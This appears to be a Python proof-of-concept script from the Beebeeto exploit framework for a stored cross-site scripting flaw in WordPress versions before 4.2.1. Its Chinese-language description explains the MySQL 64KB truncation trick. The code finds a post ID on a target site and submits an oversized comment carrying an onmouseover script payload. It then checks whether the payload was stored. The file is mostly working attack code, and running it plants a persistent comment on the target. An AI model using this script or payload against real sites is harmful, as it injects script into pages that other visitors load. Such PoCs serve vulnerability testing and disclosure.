#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import random
import string
import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0093',
            'name': 'Wordpress < 4.2.1 /wp-comments-post.php 存储型XSS漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-04-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['<4.2.1'],
            'type': 'Cross Site Scripting',
            'tag': ['Wordpress存储型XSS漏洞', '/wp-comments-post.php', 'Cross Site Scripting', 'php'],
            'desc': '''
                    安全研究团队Klikki Oy发现在新版本的wordpress中仍然可以利用该漏洞，漏洞形成的原理是一样的，
                    利用截断来造成页面布局混乱，只不过这次Klikki Oy利用了mysql的另外一个特点。

                    在wordpress wp_comments表中存储留言的列为comment_content，他的类型为text。
                    Text最大可以存储64kb的数据，如果用户输入了大于64kb的数据，mysql的做法依然是将后面的内容截断，
                    由于wordpress并没有限制留言内容的长度，所以当我们提交大于64kb的留言内容时，
                    依然可以造成页面布局的混乱，形成xss。
                    ''',
            'references': [
                    'http://seclists.org/fulldisclosure/2015/Apr/84',
                    'https://wordpress.org/news/2015/04/wordpress-4-2-1/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        verify_url =  target + "/wp-comments-post.php"
        rand_str = lambda length: ''.join(random.sample(string.letters, length))
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Checking...'
        try:
            post_id = re.search(r'post-(?P<post_id>[\d]+)',
                                requests.get(target).content).group('post_id')
        except:
            if args['options']['verbose']:
                print '[-] Not WordPress'
            return args
        ttys = "<a title='tmp style=beebeeto onmouseover=alert(1)// %s'>tmp@beebeeto</a>"
        flag = 'A' * 66666
        payload = {
            'author': rand_str(10),
            'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
            'url': 'http://www.beebeeto.com',
            'comment': ttys % flag,
            'comment_post_ID': post_id,
            'comment_parent': 0,
        }
        if args['options']['verbose']:
            print '[*] Send Payload ...'
        content = requests.post(verify_url, data=payload).content
        if '<a title=&#8217;tmp style=beebeeto onmouseover=alert(1)//' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = '%s/?p=%s' % (target, post_id)
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())